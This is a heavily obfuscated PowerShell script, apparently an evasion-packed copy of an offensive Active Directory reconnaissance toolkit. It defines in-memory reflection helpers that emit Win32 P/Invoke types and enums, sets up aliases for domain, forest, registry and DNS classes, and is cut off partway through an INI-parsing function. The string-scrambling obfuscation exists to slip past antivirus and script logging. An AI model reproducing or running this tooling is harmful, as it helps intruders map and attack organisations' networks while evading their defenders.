&('SV') 48Pz1 ([TYpE]("{1}{0}" -F'ID','gU')  ) ;   ${0`OG}=[TyPE]("{0}{3}{1}{2}"-F'ap','dom','Ain','p') ;   &("{1}{2}{0}" -f'M','set','-itE') ('v'+'aRIaB'+'Le:9gJ'+'tR')  ( [Type]("{7}{1}{9}{11}{8}{2}{4}{0}{5}{3}{10}{6}" -F'ALlIn','UNTime.','SeRVI','eNti','cEs.C','gCoNV','N','r','p','Int','O','ero')  ); &("{0}{1}" -f's','ET')  ('a2'+'3E') ([TYpe]("{2}{0}{5}{4}{1}{3}"-f'ERvICEs.','rSe','RUNtIME.INTErOpS','t','Ha','c')  );  &("{1}{0}" -f 'ItEM','sET-')  ("VARI"+"A"+"b"+"l"+"e:TnKSA")  ([TYpe]("{7}{1}{2}{3}{5}{8}{4}{6}{0}{9}"-F 'aTtRIBu','.','i','NteRopSerV','dlLiMPo','iC','rT','RUntiME','es.','te'))  ;   ${DU`OKs}=  [tyPe]("{1}{2}{0}" -F'E','f','lagSaTtriBuT');    &("{0}{1}{2}" -f'SE','t','-ITem') ('vAr'+'IaBLe:'+'dBx6'+'4') ([typE]("{5}{1}{2}{0}{3}{4}{6}" -F'It.','C','TioN.EM','Pac','KINgsi','REfLE','ze'));&("{0}{1}"-f'SE','T-Item') ("VaRiable"+":"+"U14"+"o")  (  [TYpE]("{2}{1}{0}{3}{7}{6}{5}{4}"-F'c','E','refl','T','ES','T','typEaTTribu','iON.')) ; &("{2}{0}{1}" -f'et-I','TEm','S')  ("vARI"+"ABLe:M2s"+"L9")  ( [type]("{6}{3}{9}{4}{0}{5}{8}{2}{7}{10}{1}" -F'ViC','bUTe','A','un','imE.InTERoPSEr','eS','R','lasa','.maRSH','T','tTrI') )  ;  &('SV')  1WNsL ([tYPE]("{1}{0}"-f'Pe','Ty'));  &("{1}{0}" -f 'T','Se')  7C92Aw ([type]("{2}{5}{1}{0}{4}{3}" -f 'On.','EctI','RE','DEs','emIT.oPCO','fl') )  ;   &("{2}{0}{1}{3}"-f'et-VAR','IABL','s','e')  3WeuXd (  [TypE]("{1}{0}" -F'eT.DNS','n'))  ;  &("{1}{0}" -f 'T','se') ('eO'+'y0X1') ( [tyPe]("{0}{1}" -F'daT','eTiMe')) ;  &('sV') pneYM ([tYPE]("{0}{1}{4}{2}{5}{6}{3}"-F 'SySte','M','EFLE','NGFLags','.R','CTION.','BindI')  );   ${S4`cLn7}  =[TyPE]("{7}{3}{6}{4}{8}{0}{5}{2}{1}"-F 'IVEDIrec','in','DOMA','SteM','I','torY.','.DIreCtorySErV','sy','CEs.acT') ;   ${T`N8`ChZ} =  [tyPE]("{5}{6}{8}{13}{10}{1}{2}{0}{3}{12}{7}{11}{9}{4}" -F 'S.act','tORY','sErViCe','iV','.FoREST','S','Ys','IRECt','Tem.Di','Ry','C','o','ed','RE')  ;    &("{0}{1}{2}"-f 's','eT-it','Em') VaRIable:WXmo ( [type]("{2}{0}{1}" -F'oNVERt','eR','bitc')  )  ;   ${Wx`oV}  =  [type]("{2}{0}{1}{7}{5}{4}{6}{3}" -f 'T','Rin','sYSTEM.s','s','iO','LitoPt','N','gSP');  &("{0}{1}{2}"-f 'sET','-','iTeM')  VarIABLE:hx0F  ( [TypE]("{1}{0}" -f 'x','rEge')  ); ${1m`P`zl} =[TYPe]("{6}{1}{0}{3}{2}{5}{4}{7}"-f 'OfT','crOS','in32.Re','.W','R','GIST','Mi','YKEy')  ;   &('SV')  5lop3 ( [TYpE]("{2}{0}{5}{7}{3}{6}{1}{4}" -f'u','A','r','iNteRoPs','rShAl','Nti','ERvIces.M','me.')  )  ;  &("{1}{2}{0}" -f'eM','seT','-it')  ('VA'+'RiABLe'+':nG8U7')  ([type]("{14}{13}{11}{1}{3}{10}{0}{7}{12}{2}{6}{9}{8}{5}{4}" -f'.r','.aUTom','.InItiAL','AT','E','t','sESsio','Un','TA','NS','iOn','ENT','SpAces','sTeM.mANaGEm','sy')  ); ${W`9g7}  =[tYpe]("{4}{1}{3}{5}{6}{2}{0}" -F 'aD','t','HRe','E','Sys','m.thReadiN','g.T');  &("{1}{2}{0}" -f'tEm','sEt','-i')  ("V"+"ARIaBlE:iK0"+"F")  ([tYPE]("{4}{2}{0}{1}{3}" -F 'EFA','cTo','UNspAC','Ry','r') ) ;&("{2}{1}{0}" -f'tEM','T-I','SE')  ("VAr"+"IABLe"+":oL"+"nQ")  ( [TYpe]("{0}{3}{1}{2}" -F'P','hE','ll','oWErS') ); &("{0}{2}{1}" -f 'S','tEM','eT-i') ('vARI'+'A'+'BLe'+':nw'+'2b')  (  [Type]("{4}{0}{2}{1}{3}"-f'st','M.Io.fi','E','le','sY')  ) ;   &('SV') Jh485  ([TyPE]("{1}{0}{3}{2}"-F 'StEM.I','Sy','mOdE','O.FIle') )  ;  ${n3`w`x7M}  =[tYpe]("{2}{0}{1}{4}{3}"-f'T','EM.','sYs','Ss','iO.FIleAcce')  ;    ${n`zG7}  =  [TyPe]("{1}{3}{0}{2}" -f 'SHAr','io.FIl','e','e')  ;    &("{0}{2}{1}"-f'SeT-VaR','Ble','IA') ('gk'+'8') (  [TyPe]("{3}{4}{2}{0}{1}" -f'er','T','NV','sys','tEm.Co') ) ;  &("{0}{1}" -f'sE','T') YDPel  ([TyPE]("{4}{2}{3}{1}{0}" -f'encodiNG','T.','TE','x','SYSTEm.') )  ;   ${c`2aKQ}  =[TyPE]("{4}{3}{1}{0}{2}"-f 'S','n.as','EMBlY','lEctIo','reF') ; &("{2}{1}{0}"-f'-IteM','T','se')  VaRiABLE:dQU0tF ( [TYPE]("{2}{1}{4}{5}{0}{3}{7}{6}"-f 'YSERVICES','dIre','SyStem.','.SEcU','cto','R','ASks','riTym'))  ;  &("{0}{3}{2}{1}" -f 'S','LE','riAB','Et-VA')  ('R7d'+'W') (  [tyPe]("{0}{1}" -F 'E','Num')  ); &("{2}{1}{0}" -f 'rIable','Va','seT-')  839 ([TYPE]("{1}{3}{2}{0}"-f 'ROnmENT','e','VI','N')  ) ; &("{1}{0}"-f'Et','S') ("1"+"4f2b") ( [tYpe]("{1}{0}{2}"-f'STEm.ne','SY','T.Dns') ); &("{0}{1}"-f 'sEt-','itEm')  vaRiABLe:qCf0z6 ( [TypE]('Gc') );   ${R`7i`sGB}  =  [tYpE]("{1}{0}"-f '32','InT');    &("{1}{0}"-f 'et-ITEm','S')  ("v"+"arIA"+"BLE:"+"J8L"+"9YC") ([TyPE]("{0}{2}{1}" -f'IN','PtR','t')  )  ;   &("{0}{2}{1}"-f 'SET-','tEM','I')  varIabLe:02E  (  [TYpE]("{1}{0}{2}" -f 't','S','rinG'))  ; 











function NeW`-INMEMO`Rym`odULe
{


    Param
    (
        [Parameter(POSiTioN = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${mOd`UleNa`ME} =   ${4`8p`z1}::("{0}{1}" -f'NewGu','id').Invoke().("{0}{1}{2}" -f'ToS','tri','ng').Invoke()
    )

    ${LOaDE`d`A`ssemB`li`ES} =   ${0`oG}::"c`UrReNt`dO`main".("{2}{0}{1}{3}"-f 'etAsse','m','G','blies').Invoke()

    ForEach (${AS`Sembly} in ${lOAd`eDassE`Mbl`i`ES}) {
        if (${a`SSE`m`BLY}."fuLL`NA`ME" -and (${AsseMB`Ly}."F`ULlNAmE".("{0}{1}" -f'Spli','t').Invoke(',')[0] -eq ${MODU`LeN`Ame})) {
            return ${AS`SEMB`Ly}
        }
    }

    ${dYN`As`S`emBlY} = &("{0}{2}{1}" -f'New-','t','Objec') ("{1}{3}{6}{4}{2}{5}{0}"-f'ame','Ref','Assembl','l','ction.','yN','e')(${mO`DuLenA`ME})
    ${dOm`A`In} =   ( &("{1}{0}"-f'DiTEm','CHIL')  vARIabLe:0Og )."V`ALUe"::"cUrrE`NT`DoMAIn"
    ${A`sS`e`mBLYBU`iLdER} = ${Do`ma`in}.("{1}{3}{4}{2}{0}" -f 'embly','Define','Ass','D','ynamic').Invoke(${DYN`A`SsEmbLy}, 'Run')
    ${m`O`D`ULebUilDER} = ${A`ssEmblyb`U`Il`dER}.("{1}{3}{0}{2}" -f'o','Def','dule','ineDynamicM').Invoke(${MoDuL`e`Na`Me}, ${fa`LSe})

    return ${M`Odule`BUIl`DER}
}




function F`UNC
{
    Param
    (
        [Parameter(PosITion = 0, MANDatoRY = ${TR`Ue})]
        [String]
        ${dl`L`NAme},

        [Parameter(POsiTION = 1, mANDaToRy = ${tr`Ue})]
        [String]
        ${FuN`cTi`o`N`NAmE},

        [Parameter(PoSitIon = 2, ManDaTORy = ${tr`UE})]
        [Type]
        ${R`etuR`NtYpe},

        [Parameter(POSITion = 3)]
        [Type[]]
        ${pa`Ram`E`TE`RTYPeS},

        [Parameter(POSITiOn = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${Na`TiVE`cALl`in`g`co`NVENTIon},

        [Parameter(POsiTIoN = 5)]
        [Runtime.InteropServices.CharSet]
        ${C`ha`RsET},

        [Switch]
        ${s`E`Tl`ASteRroR}
    )

    ${p`RoP`Er`Ties} = @{
        ("{0}{1}" -f'Dll','Name') = ${dLLNa`Me}
        ("{0}{3}{2}{1}" -f 'F','ionName','t','unc') = ${F`UnCTIoNN`Ame}
        ("{0}{1}{2}" -f 'Re','t','urnType') = ${re`TUrNTy`Pe}
    }

    if (${pARa`mE`TE`RT`ypEs}) { ${PRop`e`RtIES}[("{4}{1}{0}{3}{2}"-f'et','m','rTypes','e','Para')] = ${pA`RaME`Ter`TYPes} }
    if (${NaTIveca`l`lI`NGCo`Nv`eNti`On}) { ${P`RopER`TiES}[("{5}{1}{2}{6}{0}{4}{3}" -f 'gConv','at','iv','ion','ent','N','eCallin')] = ${Nat`IvECALlin`Gco`NVeN`TiOn} }
    if (${C`hARs`ET}) { ${pRoPeR`TI`ES}[("{1}{0}" -f 'set','Char')] = ${C`HArSET} }
    if (${seTla`sT`ERR`Or}) { ${Pro`Pert`iES}[("{1}{0}{3}{2}"-f'e','S','LastError','t')] = ${SEtLas`T`ER`Ror} }

    &("{0}{1}{2}"-f'New','-Obje','ct') ("{1}{2}{0}"-f'ct','PS','Obje') -Property ${PrOPEr`T`ieS}
}


function aDd`-`wi`N32tyPE
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(MaNDatORY = ${TR`UE}, ValueFROmPiPeLinEBypROpeRTynaME = ${t`RuE})]
        [String]
        ${Dll`NamE},

        [Parameter(manDatOry = ${t`RuE}, vAlUeFROMpipeLINeBYprOpeRtYnaMe = ${T`Rue})]
        [String]
        ${fUn`cTi`OnN`A`Me},

        [Parameter(MaNDatOry = ${T`RUe}, VALUEfROMPIpeLiNebyprOpertYNAmE = ${Tr`Ue})]
        [Type]
        ${R`e`TUR`NtypE},

        [Parameter(vaLUEFROmPiPeLInebyPrOpErTyNAMe = ${Tr`Ue})]
        [Type[]]
        ${P`A`RAmE`TeRtYpES},

        [Parameter(vAluEFRoMPiPELiNEBYpROpErtYnAme = ${T`RUE})]
        [Runtime.InteropServices.CallingConvention]
        ${N`AtiVE`c`A`llIngCo`NVenT`Ion} =   ${9g`Jtr}::"StDCA`lL",

        [Parameter(valUeFRoMpIPeLIneBYPRopertYName = ${tr`UE})]
        [Runtime.InteropServices.CharSet]
        ${C`haRS`eT} =  ( &("{0}{1}" -f'GC','i')  ('V'+'ArI'+'able:a23e') )."VaL`UE"::"A`UTO",

        [Parameter(VaLUEFRompipEliNebYprOPErtYnAme = ${tR`UE})]
        [Switch]
        ${SE`TLA`SteRRor},

        [Parameter(MAndatory = ${tr`Ue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${MO`DuLe},

        [ValidateNotNull()]
        [String]
        ${na`MesP`ACe} = ''
    )

    BEGIN
    {
        ${TYpE`H`ASH} = @{}
    }

    PROCESS
    {
        if (${modu`Le} -is [Reflection.Assembly])
        {
            if (${NaME`SPa`cE})
            {
                ${tyP`e`hAsh}[${D`LL`NamE}] = ${MOdU`Le}.("{1}{2}{0}" -f'ype','Get','T').Invoke("$Namespace.$DllName")
            }
            else
            {
                ${tYpE`hASh}[${DLlNa`mE}] = ${M`o`dUlE}.("{0}{1}" -f'Get','Type').Invoke(${D`lln`Ame})
            }
        }
        else
        {
            
            if (!${t`YP`E`Hash}.("{0}{2}{1}"-f 'C','Key','ontains').Invoke(${dlL`NA`ME}))
            {
                if (${N`AME`spA`ce})
                {
                    ${TYp`e`HaSh}[${Dl`L`Name}] = ${m`oD`Ule}.("{0}{1}{2}"-f 'Def','i','neType').Invoke("$Namespace.$DllName", ("{4}{5}{6}{2}{3}{0}{1}" -f'eldIni','t','for','eFi','P','ublic,','Be'))
                }
                else
                {
                    ${t`ypEha`Sh}[${D`lLnaME}] = ${m`oDuLe}.("{1}{2}{0}"-f'ype','Defin','eT').Invoke(${d`L`LNAMe}, ("{6}{0}{1}{2}{4}{5}{3}"-f'B','efore','Fi','Init','el','d','Public,'))
                }
            }

            ${mE`Th`oD} = ${t`YPEHA`SH}[${Dl`ln`AMe}].("{3}{0}{2}{1}" -f 'efine','od','Meth','D').Invoke(
                ${fUn`cTiO`NNa`me},
                ("{2}{3}{4}{5}{0}{1}"-f 'm','pl','Publ','ic',',Static,Pin','vokeI'),
                ${RE`TurN`Ty`pE},
                ${p`Aram`e`TerTYP`eS})

            
            ${I} = 1
            ForEach(${P`AR`AmeT`eR} in ${p`ArAm`ETERTyp`eS})
            {
                if (${P`ARAm`Eter}."ISBYr`ef")
                {
                    [void] ${M`eT`hOd}.("{0}{1}{3}{4}{2}" -f 'D','efineP','r','a','ramete').Invoke(${i}, 'Out', ${N`UlL})
                }

                ${I}++
            }

            ${DLL`imP`oRT} = [Runtime.InteropServices.DllImportAttribute]
            ${SE`TlaSter`ROr`FIELD} = ${dlL`Im`p`ORt}.("{0}{2}{1}"-f 'Get','d','Fiel').Invoke(("{2}{1}{3}{0}"-f 'or','t','SetLas','Err'))
            ${ca`LLIn`G`coN`VentI`oNfI`elD} = ${dl`lI`mP`ORt}.("{0}{2}{1}" -f'GetF','d','iel').Invoke(("{4}{0}{3}{2}{1}" -f'llingC','n','io','onvent','Ca'))
            ${ChaRS`E`TF`IelD} = ${D`LLiM`p`oRT}.("{2}{1}{0}"-f'd','Fiel','Get').Invoke(("{2}{0}{1}" -f 'arSe','t','Ch'))
            if (${sE`TlAS`TeRR`or}) { ${sL`Eval`UE} = ${TR`UE} } else { ${slE`V`ALuE} = ${f`A`lSe} }

            
            ${CONsT`RU`CTor} =   ( &("{0}{1}" -f 'G','CI') ("VaRi"+"A"+"B"+"l"+"E:TnKsA")  )."VaL`Ue"."g`ETco`NStRuct`OR"([String])
            ${dLl`iMpor`TATt`RiBute} = &("{1}{2}{0}"-f 'ect','Ne','w-Obj') ("{1}{0}{2}{4}{3}{5}{6}" -f'ct','Refle','ion.Emit','ibut','.CustomAttr','eBuild','er')(${CO`N`StRucT`oR},
                ${DL`LNa`Me}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${Se`TlAs`TerroR`Field}, ${cA`llinG`COnVe`NtI`onf`IeLD}, ${CH`A`R`sETFieLd}),
                [Object[]] @(${S`lEva`lUE}, ([Runtime.InteropServices.CallingConvention] ${na`Ti`Ve`C`AlliNgcONVENTion}), ([Runtime.InteropServices.CharSet] ${CHA`R`SET})))

            ${m`eth`od}.("{4}{1}{2}{3}{0}" -f'tribute','C','ustomA','t','Set').Invoke(${D`LLiMp`oRTATT`Ri`BU`Te})
        }
    }

    END
    {
        if (${mod`Ule} -is [Reflection.Assembly])
        {
            return ${t`yPE`HaSH}
        }

        ${ReTU`RNt`Y`pes} = @{}

        ForEach (${k`EY} in ${t`y`PehAsh}."K`eys")
        {
            ${T`YPE} = ${T`y`peHA`SH}[${k`eY}].("{0}{2}{1}"-f'C','Type','reate').Invoke()

            ${Retu`RNTyp`Es}[${K`ey}] = ${ty`Pe}
        }

        return ${r`ETURN`Ty`pES}
    }
}


function Pse`N`UM
{


    [OutputType([Type])]
    Param
    (
        [Parameter(poSItION = 0, mANdatOry = ${T`RuE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${MO`Dule},

        [Parameter(POsITIoN = 1, ManDatOrY = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`UL`LName},

        [Parameter(POsition = 2, MAnDaTORY = ${T`RuE})]
        [Type]
        ${t`yPe},

        [Parameter(poSiTIon = 3, manDaTOry = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${en`UMeleM`E`NTS},

        [Switch]
        ${B`it`FiElD}
    )

    if (${Modu`lE} -is [Reflection.Assembly])
    {
        return (${mO`dUle}.("{1}{2}{0}"-f 'pe','GetT','y').Invoke(${FU`ll`N`AmE}))
    }

    ${eNu`M`TYpE} = ${T`ype} -as [Type]

    ${enuMbUi`L`DEr} = ${modU`LE}.("{1}{0}{2}" -f'e','D','fineEnum').Invoke(${fUlln`A`me}, ("{0}{2}{1}"-f'Pu','lic','b'), ${E`N`U`mtype})

    if (${b`itfIEld})
    {
        ${FLAGs`C`onsTr`UCTOr} =  ${D`UoKS}."GE`Tc`ONst`RUCTOr"(@())
        ${fl`AGsCUst`OMATT`RI`BUtE} = &("{0}{1}{2}"-f 'Ne','w-','Object') ("{1}{0}{3}{6}{2}{5}{4}" -f'i','Reflect','u','on.Em','AttributeBuilder','stom','it.C')(${Fl`AgS`Con`STRuCt`oR}, @())
        ${eNU`MB`Uilder}.("{3}{2}{4}{1}{0}" -f'te','ribu','tCustomA','Se','tt').Invoke(${flAGs`CUSt`omATtr`Ib`UTe})
    }

    ForEach (${k`eY} in ${eNU`MeleMen`TS}."KE`ys")
    {
        
        ${n`ULl} = ${enUmBuI`ld`eR}."Defi`NE`liTer`Al"(${K`eY}, ${EnuM`ElEm`EN`TS}[${k`EY}] -as ${e`N`U`Mtype})
    }

    ${eNUMbu`I`l`Der}.("{1}{2}{0}"-f'eateType','C','r').Invoke()
}




function fI`elD
{
    Param
    (
        [Parameter(POsiTion = 0, MANdAToRY = ${TR`UE})]
        [UInt16]
        ${pO`sIT`IOn},

        [Parameter(posiTion = 1, mandaTORY = ${T`Rue})]
        [Type]
        ${t`YPE},

        [Parameter(pOSItIoN = 2)]
        [UInt16]
        ${O`FfseT},

        [Object[]]
        ${m`A`RsHAlaS}
    )

    @{
        pOsiTioN = ${P`OsI`TiON}
        ("{0}{1}" -f'T','ype') = ${t`YpE} -as [Type]
        ("{0}{1}" -f 'Offse','t') = ${o`F`FSeT}
        ("{0}{1}{2}"-f'M','arshal','As') = ${m`Arsh`A`las}
    }
}


function s`T`RuCT
{


    [OutputType([Type])]
    Param
    (
        [Parameter(PosITiOn = 1, manDatoRy = ${tR`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`d`ULe},

        [Parameter(pOsitiON = 2, mANDAtORY = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`ULlna`Me},

        [Parameter(POSitIOn = 3, maNDATORY = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${S`Tr`Uc`TfiELdS},

        [Reflection.Emit.PackingSize]
        ${p`ACkIN`gSiZe} =   ${D`B`x64}::"U`Nspe`CI`FiEd",

        [Switch]
        ${EXpL`I`Citl`AyOUt}
    )

    if (${M`odU`Le} -is [Reflection.Assembly])
    {
        return (${M`oD`ULE}.("{1}{0}{2}"-f 'etTy','G','pe').Invoke(${fuL`LnA`mE}))
    }

    [Reflection.TypeAttributes] ${st`R`UcTa`Tt`RibUTES} = ("{14}{3}{2}{7}{0}{17}{10}{12}{19}{8}{18}{16}{20}{1}{4}{11}{15}{9}{6}{13}{5}"-f '       ','led,
     ','iClass,','ns','  ','nit','i','
 ','ublic,
     ','eforeF','s',' ','s,
        ','eldI','A','B','  S','Cla',' ','P','ea')

    if (${eXPLici`T`layo`UT})
    {
        ${s`TRUcT`Attri`BuTES} = ${STrUcTaT`T`RI`But`es} -bor   ( &("{1}{2}{3}{0}" -f 'LE','get','-Varia','b')  u14O  )."Va`LuE"::"eXp`L`i`CitlAyO`Ut"
    }
    else
    {
        ${s`T`RuC`T`AtTr`IbUTeS} = ${STruCTaTT`RiB`U`TeS} -bor   ( &("{0}{1}{2}"-f 'gEt-','vAr','IabLe')  ("u"+"14o")  )."Va`lUe"::"seQ`UEN`TIalLay`OUt"
    }

    ${S`TruC`T`BUilDEr} = ${MoD`ULe}."DefIN`eTY`pe"(${FUl`L`NamE}, ${sTru`Cta`TTriBuT`eS}, [ValueType], ${PA`CKi`NGsI`ze})
    ${co`NsTr`U`CtO`RI`NFo} =  (  &("{3}{1}{4}{0}{2}"-f'D','T-','iTem','GE','cHIL')  variable:m2sl9  )."VaL`UE".("{3}{0}{4}{1}{2}" -f 'etCon','t','ors','G','struc').Invoke()[0]
    ${siz`Ec`ONSt} = @( ( &("{0}{1}{2}"-f 'gE','T-','itEM')  ("vAri"+"abLE:M2S"+"l9"))."VaL`Ue".("{2}{1}{0}"-f 'eld','Fi','Get').Invoke(("{1}{2}{0}" -f 'st','SizeC','on')))

    ${fI`eLDs} = &("{0}{2}{1}{3}"-f'New-O','c','bje','t') ("{1}{3}{2}{0}"-f 'ble[]','H','hta','as')(${sTru`ctFi`EL`ds}."CoU`Nt")

    
    
    
    ForEach (${F`ieLd} in ${s`Truct`FI`elDS}."kE`yS")
    {
        ${IN`DEX} = ${S`Tru`CTFIeldS}[${f`ieLd}][("{0}{1}{2}" -f 'P','ositio','n')]
        ${F`I`elds}[${inD`eX}] = @{("{1}{0}"-f'eldName','Fi') = ${f`iEld}; ("{2}{1}{0}{3}"-f'ie','rt','Prope','s') = ${S`TRu`ctfI`eldS}[${FI`eld}]}
    }

    ForEach (${Fie`LD} in ${F`IeL`ds})
    {
        ${f`IeLD`NA`mE} = ${f`Ield}[("{2}{0}{1}" -f'eldNam','e','Fi')]
        ${fIElD`p`Rop} = ${fi`E`LD}[("{0}{2}{1}"-f'Pr','perties','o')]

        ${OFFS`Et} = ${F`IEL`dpROp}[("{0}{1}" -f 'Off','set')]
        ${T`YPE} = ${F`IeLdPr`op}[("{0}{1}"-f'Typ','e')]
        ${MArSHa`l`AS} = ${fiEL`d`pR`op}[("{2}{0}{1}" -f 'arsha','lAs','M')]

        ${nE`wfIE`LD} = ${s`TR`U`CTB`UIlder}.("{1}{3}{2}{0}" -f 'eld','Defin','i','eF').Invoke(${fi`e`LdnamE}, ${t`YPE}, ("{1}{0}"-f 'blic','Pu'))

        if (${mARs`H`AlAs})
        {
            ${un`ma`NaGE`DT`ypE} = ${m`Arsh`ALAS}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${mAR`sh`Al`AS}[1])
            {
                ${si`Ze} = ${mArS`H`A`lAs}[1]
                ${ATTrIBBU`Ild`ER} = &("{3}{2}{0}{1}" -f 'c','t','-Obje','New') ("{9}{8}{3}{4}{7}{10}{2}{6}{0}{5}{1}" -f 'uteBu','er','ustomAttri','e','c','ild','b','tion.E','fl','Re','mit.C')(${Co`NSt`RUctORiN`FO},
                    ${U`NmaNAG`E`D`TYPe}, ${S`IZe`cONsT}, @(${si`zE}))
            }
            else
            {
                ${AtTri`B`Buil`DER} = &("{2}{3}{0}{1}"-f 'Ob','ject','N','ew-') ("{5}{6}{0}{2}{1}{7}{8}{3}{4}" -f 'Em','t.','i','uteBuil','der','Ref','lection.','Cus','tomAttrib')(${c`OnSt`Ru`cTo`RiNFo}, [Object[]] @(${UnmaN`AgedT`y`Pe}))
            }

            ${N`eWFIe`Ld}.("{0}{1}{4}{3}{2}"-f 'Set','Cust','te','ribu','omAtt').Invoke(${ATT`R`I`Bbu`iLDer})
        }

        if (${exPlI`cItLAY`OUt}) { ${Ne`wFIE`lD}.("{1}{2}{0}" -f 'et','Se','tOffs').Invoke(${o`Ff`SEt}) }
    }

    
    
    ${s`Iz`EME`ThoD} = ${STR`U`cTbuiL`DER}.("{1}{2}{0}{3}" -f'eM','Def','in','ethod').Invoke(("{0}{1}" -f 'G','etSize'),
        ("{1}{2}{0}" -f 'tatic','Publ','ic, S'),
        [Int],
        [Type[]] @())
    ${ilgE`NER`A`ToR} = ${Siz`eM`et`HoD}.("{2}{1}{0}" -f 'or','tILGenerat','Ge').Invoke()
    
    ${ilgeN`ERA`TOR}.("{1}{0}"-f 'mit','E').Invoke(  ( &("{2}{0}{1}"-f 'TE','m','cHILdI')  ("v"+"aR"+"IAblE:7C9"+"2Aw") )."vAL`UE"::"ldt`o`ken", ${s`TRUC`T`BuILDeR})
    ${Il`gEnera`T`OR}.("{1}{0}"-f 't','Emi').Invoke(  (&("{0}{1}" -f'gC','i')  vaRIAble:7c92aw)."VA`LUE"::"C`All",
          (&("{0}{2}{1}"-f'v','riaBLE','A')  1WNsl)."VAL`UE".("{1}{3}{0}{2}"-f 'th','GetM','od','e').Invoke(("{0}{1}{4}{2}{3}" -f 'G','et','a','ndle','TypeFromH')))
    ${IL`G`EN`ERaTor}.("{0}{1}"-f'E','mit').Invoke( (&("{1}{2}{3}{0}"-f 'E','Get-','va','rIAbL') ('7C'+'92aw')  -va )::"c`ALl",
          ( &("{1}{0}" -f'teM','i') ('VA'+'ri'+'a'+'bLe:5loP'+'3'))."Va`LUE".("{2}{1}{0}"-f 'd','tMetho','Ge').Invoke(("{1}{0}"-f'zeOf','Si'), [Type[]] @([Type])))
    ${I`lGe`NE`RatOr}.("{1}{0}"-f'mit','E').Invoke( ${7`c92`AW}::"R`ET")

    
    
    ${impL`ICITcon`Ve`R`T`eR} = ${S`TrU`cTbuI`LDER}.("{2}{0}{3}{1}" -f'fine','ethod','De','M').Invoke(("{3}{2}{0}{1}"-f 'I','mplicit','p_','o'),
        ("{1}{0}{5}{3}{6}{2}{7}{4}{8}"-f 'i','Pr',' S','Public',' HideByS','vateScope, ',',','tatic,','ig, SpecialName'),
        ${strU`C`TBuildEr},
        [Type[]] @([IntPtr]))
    ${Il`geN`ER`AToR2} = ${iMplicIT`co`NVERt`ER}.("{0}{1}{2}"-f'GetI','L','Generator').Invoke()
    ${IlGeNEr`A`TO`R2}.("{0}{1}"-f'Em','it').Invoke( (  &("{2}{0}{1}"-f'ET-I','TEm','g')  VaRiAbLe:7C92aW  )."val`UE"::"N`OP")
    ${iL`gE`N`eraTor2}.("{1}{0}"-f't','Emi').Invoke( (&("{3}{2}{1}{0}" -f 'LE','ab','t-VARI','GE')  ('7c92'+'aw') -vaLueONLY)::"ld`Ar`G_0")
    ${ilG`enERat`o`R2}.("{0}{1}" -f 'Em','it').Invoke(  ( &("{2}{3}{1}{0}"-f 'IABlE','Ar','geT-','V') ('7c9'+'2AW')  )."v`AlUe"::"LD`Token", ${s`TR`UcT`BUiLdEr})
    ${i`LgeNer`At`or2}.("{0}{1}"-f'Emi','t').Invoke( ${7c92`AW}::"c`All",
         ( &("{2}{0}{1}" -f'RIA','BLe','geT-vA')  1WNSl)."V`AluE".("{1}{0}{2}" -f 'et','G','Method').Invoke(("{1}{2}{3}{0}"-f'andle','Ge','tT','ypeFromH')))
    ${IlGEn`erAT`o`R2}.("{1}{0}"-f 'mit','E').Invoke(  (  &("{1}{0}" -f 'cI','g')  ("Var"+"IabLE:7c92"+"AW")  )."val`UE"::"ca`Ll",
          ${5`lOP3}.("{0}{1}{2}" -f 'GetM','e','thod').Invoke(("{1}{3}{0}{2}" -f 'ruc','PtrT','ture','oSt'), [Type[]] @([IntPtr], [Type])))
    ${iL`gENerA`TOR2}.("{0}{1}"-f'Em','it').Invoke(  (  &('ls')  VAriablE:7c92aW  )."Va`lUe"::"un`B`oX_ANY", ${S`TruC`TbUil`Der})
    ${iL`G`Enerat`or2}.("{1}{0}"-f'mit','E').Invoke( (  &("{2}{1}{0}" -f'ItEm','D','get-cHil')  VARIaBle:7c92aw )."vA`LuE"::"R`Et")

    ${St`Ru`ctBUILDeR}.("{1}{2}{0}"-f'ype','Cr','eateT').Invoke()
}








filter Ge`T-inicont`eNt {

    [CmdletBinding()]
    Param(
        [Parameter(MAnDAtORy=${T`Rue}, vALuEfRoMPiPeLINe=${tR`UE}, vaLUefRompiPELInebYpROpErTYNAme=${t`RUE})]
        [Alias({"{1}{0}"-f 'ame','FullN'})]
        [ValidateScript({ &("{0}{1}{2}" -f 'Tes','t-Pa','th') -Path ${_} })]
        [String[]]
        ${P`ATH}
    )

    ForEach(${tArgET`p`AtH} in ${p`AtH}) {
        ${in`i`obJE`ct} = @{}
        Switch -Regex -File ${TAR`G`et`pAtH} {
            ((("{3}{2}{1}{0}"-f'Nq7]','.+)','(','^Nq7['))  -CrEpLaCe 'Nq7',[Char]92) 
            {
                ${S`E`CTiOn} = ${Ma`TChEs}[1].("{1}{0}"-f 'rim','T').Invoke()
                ${iNioBJ`E`CT}[${s`Ec`TiON}] = @{}
                ${c`oM`meNT`COUNT} = 0
            }
            "^(;.*)$" 
            {
                ${Val`Ue} = ${M`Atc`HeS}[1].("{1}{0}" -f 'rim','T').Invoke()
                ${CO`mMe`Nt`COUnt} = ${cOmMEn`T`COuNt} + 1
                ${N`AMe} = ("{1}{0}" -f 'mment','Co') + ${Com`mentc`o`UnT}
                ${iN`iobJ`Ect}[${SecT`i`ON}][${n`AME}] = ${V`AlUE}
            }
            ((("{2}{3}{0}{1}" -f'){0}','s*=(.*)','(.+','?')) -f  [CHAR]92) 
            {
                ${n`AMe}, ${vA`lUE} = ${MA`TcHes}[1..2]
                ${na`me} = ${Na`ME}.("{1}{0}"-f 'rim','T').Invoke()
